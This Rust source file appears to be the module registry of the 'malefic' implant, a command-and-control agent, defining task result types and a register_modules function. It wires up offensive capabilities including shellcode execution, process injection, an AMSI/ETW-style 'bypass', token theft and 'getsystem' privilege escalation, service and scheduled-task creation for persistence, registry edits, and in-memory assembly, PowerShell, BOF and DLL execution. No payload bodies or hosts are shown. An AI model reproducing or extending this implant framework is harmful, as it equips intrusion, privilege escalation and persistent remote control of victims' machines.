#![feature(stmt_expr_attributes)]
#![feature(type_alias_impl_trait)]
#![feature(async_closure)]
pub mod execute;
pub mod fs;
mod r#macro;
pub mod net;
pub mod prelude;
pub mod sys;

use async_trait::async_trait;
use futures::channel::mpsc::{UnboundedReceiver, UnboundedSender};
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::implantpb::Status;
use malefic_proto::proto::{implantpb, modulepb};
use std::collections::HashMap;
use thiserror::Error;

pub type MaleficModule = dyn Module + Send + Sync + 'static;
pub type MaleficBundle = HashMap<String, Box<MaleficModule>>;
pub type Output = UnboundedSender<TaskResult>;
pub type Input = UnboundedReceiver<Body>;
pub type Result = anyhow::Result<TaskResult>;

#[derive(Error, Debug)]
pub enum TaskError {
    #[error(transparent)]
    OperatorError(#[from] anyhow::Error),

    #[error("")]
    NotExpectBody,

    #[error("{msg}")]
    FieldRequired { msg: String },

    #[error("{msg}")]
    FieldLengthMismatch { msg: String },

    #[error("{msg}")]
    FieldInvalid { msg: String },

    #[error("")]
    NotImpl,
}

impl TaskError {
    pub fn id(&self) -> i32 {
        match self {
            TaskError::OperatorError { .. } => 2,
            TaskError::NotExpectBody => 3,
            TaskError::FieldRequired { .. } => 4,
            TaskError::FieldLengthMismatch { .. } => 5,
            TaskError::FieldInvalid { .. } => 6,
            TaskError::NotImpl => 99,
        }
    }
}

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct TaskResult {
    pub task_id: u32,
    pub body: Body,
    pub status: Status,
}

impl TaskResult {
    fn new(task_id: u32) -> Self {
        TaskResult {
            task_id,
            status: Status {
                task_id,
                status: 0,
                error: String::default(),
            },
            body: Body::Empty(Default::default()),
        }
    }

    pub fn new_with_body(task_id: u32, body: Body) -> Self {
        TaskResult {
            task_id,
            body,
            status: Status {
                task_id,
                status: 0,
                error: String::default(),
            },
        }
    }

    pub fn new_with_ack(task_id: u32, id: u32) -> Self {
        TaskResult {
            task_id,
            status: Status {
                task_id,
                status: 0,
                error: String::default(),
            },
            body: Body::Ack(modulepb::Ack {
                id,
                success: true,
                end: false,
            }),
        }
    }

    pub fn new_with_error(task_id: u32, task_error: TaskError) -> Self {
        TaskResult {
            task_id,
            body: Body::Empty(Default::default()),
            status: Status {
                task_id,
                status: task_error.id(), // module error
                error: task_error.to_string(),
            },
        }
    }
    pub fn to_spite(&self) -> implantpb::Spite {
        let mut spite = implantpb::Spite {
            task_id: self.task_id,
            r#async: true,
            timeout: 0,
            name: String::new(),
            error: 0,
            status: Some(self.status.clone()),
            body: Some(self.body.clone()),
        };
        if self.status.status != 0 {
            spite.error = 6
        }
        spite
    }
}

// 定义扩展trait
#[async_trait]
pub trait Module: ModuleImpl {
    fn name() -> &'static str
    where
        Self: Sized;
    fn new() -> Self
    where
        Self: Sized;
    fn new_instance(&self) -> Box<MaleficModule>;
    /*     
    async fn run(&mut self, id: u32, recv_channel: &mut Input, send_channel: &mut Output)
        -> Result;
        */
}

#[async_trait]
pub trait ModuleImpl {
    async fn run(&mut self, id: u32, recv_channel: &mut Input, send_channel: &mut Output)
        -> Result;
    
}

#[cfg(not(feature = "disable_register"))]
#[no_mangle]
#[allow(improper_ctypes_definitions)]
pub extern "C" fn register_modules() -> MaleficBundle {
    let mut map: MaleficBundle = HashMap::new();

    #[cfg(debug_assertions)]
    map.insert(
        sys::example::Example::name().to_string(),
        Box::new(sys::example::Example::new()),
    );

    register_module!(map, "pwd", fs::pwd::Pwd);
    register_module!(map, "cd", fs::cd::Cd);
    register_module!(map, "ls", fs::ls::Ls);
    register_module!(map, "rm", fs::rm::Rm);
    register_module!(map, "mv", fs::mv::Mv);
    register_module!(map, "cp", fs::cp::Cp);
    register_module!(map, "mkdir", fs::mkdir::Mkdir);
    register_module!(map, "cat", fs::cat::Cat);

    register_module!(map, "upload", net::upload::Upload);
    register_module!(map, "download", net::download::Download);

    register_module!(map, "exec", execute::exec::Exec);
    register_module!(map, "open", execute::open::Open);
    register_module!(
        map,
        "execute_shellcode",
        execute::execute_shellcode::ExecuteShellcode
    );
    register_module!(map, "kill", sys::kill::Kill);
    register_module!(map, "whoami", sys::whoami::Whoami);
    register_module!(map, "env", sys::env::Env);
    register_module!(map, "env", sys::env::Setenv);
    register_module!(map, "env", sys::env::Unsetenv);
    register_module!(map, "ps", sys::ps::Ps);
    register_module!(map, "netstat", sys::netstat::Netstat);
    register_module!(map, "info", sys::info::SysInfo);

    #[cfg(target_family = "unix")]
    {
        register_module!(map, "chmod", fs::chmod::Chmod);
        register_module!(map, "chown", fs::chown::Chown);
    }

    #[cfg(target_os = "windows")]
    {
        register_module!(map, "wmi", sys::wmi::WmiQuery);
        register_module!(map, "wmi", sys::wmi::WmiExecuteMethod);
        register_module!(map, "service", sys::service::ServiceList);
        register_module!(map, "service", sys::service::ServiceStart);
        register_module!(map, "service", sys::service::ServiceStop);
        register_module!(map, "service", sys::service::ServiceDelete);
        register_module!(map, "service", sys::service::ServiceQuery);
        register_module!(map, "service", sys::service::ServiceCreate);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdList);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdCreate);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdDelete);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdStart);
        register_module!(map, "taskschd", sys::taskschd::TaskSchdStop);
        register_module!(map, "registry", sys::reg::RegQuery);
        register_module!(map, "registry", sys::reg::RegAdd);
        register_module!(map, "registry", sys::reg::RegDelete);
        register_module!(map, "registry", sys::reg::RegListKey);
        register_module!(map, "registry", sys::reg::RegListValue);
        register_module!(map, "bypass", sys::bypass::Bypass);
        register_module!(map, "inject", sys::inject::Inject);
        register_module!(map, "runas", sys::token::RunAs);
        register_module!(map, "privs", sys::token::GetPriv);
        register_module!(map, "getsystem", sys::token::GetSystem);

        // register_module!(map, "pipe", fs::pipe::PipeClose);
        register_module!(map, "pipe", fs::pipe::PipeRead);
        register_module!(map, "pipe", fs::pipe::PipeUpload);

        register_module!(map, "execute_bof", execute::execute_bof::ExecuteBof);
        #[cfg(feature = "execute_powershell")]
        register_module!(
            map,
            "execute_powershell",
            execute::execute_powershell::ExecutePowershell
        );

        #[cfg(feature = "execute_assembly")]
        register_module!(
            map,
            "execute_assembly",
            execute::execute_assembly::ExecuteAssembly
        );

        register_module!(map, "dllspawn", execute::dllspawn::ExecuteDllSpawn);
        register_module!(map, "inline_local", execute::inline_local::InlineLocal);
        register_module!(
            map,
            "execute_armory",
            execute::execute_armory::ExecuteArmory
        );
        register_module!(map, "execute_exe", execute::execute_exe::ExecuteExe);
        register_module!(map, "execute_dll", execute::execute_dll::ExecuteDll);
        register_module!(map, "execute_local", execute::execute_local::ExecuteLocal);
    }
    map
}
